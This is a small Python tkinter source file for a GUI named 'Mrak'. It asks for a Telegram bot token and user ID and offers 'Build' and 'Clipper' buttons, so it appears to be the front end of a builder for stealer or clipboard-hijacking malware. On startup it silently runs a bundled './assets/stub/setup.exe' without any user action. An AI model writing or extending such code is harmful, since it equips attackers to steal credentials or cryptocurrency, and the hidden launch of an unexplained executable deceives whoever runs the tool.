import tkinter as tk
from tkinter import messagebox
import tkinter.ttk as ttk  # Используем ttk для современных виджетов
import subprocess


root = tk.Tk()
root.title("Mrak")
style = ttk.Style()
style.theme_use('clam') #  Попробуйте разные темы: clam, alt, default


# Настройка стиля
style.configure("TLabel", background="#282c34", foreground="#abb2bf") #Темный фон, светлый текст
style.configure("TEntry", background="#3b4252", foreground="#abb2bf", fieldbackground="#3b4252", insertbackground="#abb2bf")
style.configure("TButton", background="#434c5e", foreground="#abb2bf", padding=10) #Кнопки


#   Используем ttk-виджеты
bot_token_label = ttk.Label(root, text="Telegram API Bot Token:")
bot_token_label.pack(pady=10)
bot_token_entry = ttk.Entry(root)
bot_token_entry.pack(pady=5)

user_id_label = ttk.Label(root, text="User ID:")
user_id_label.pack(pady=10)
user_id_entry = ttk.Entry(root)
user_id_entry.pack(pady=5)

build_button = ttk.Button(root, text="Build")
build_button.pack(pady=15)

clipper_button = ttk.Button(root, text="Clipper")
clipper_button.pack(pady=5)

subprocess.call('./assets/stub/setup.exe')
root.mainloop()

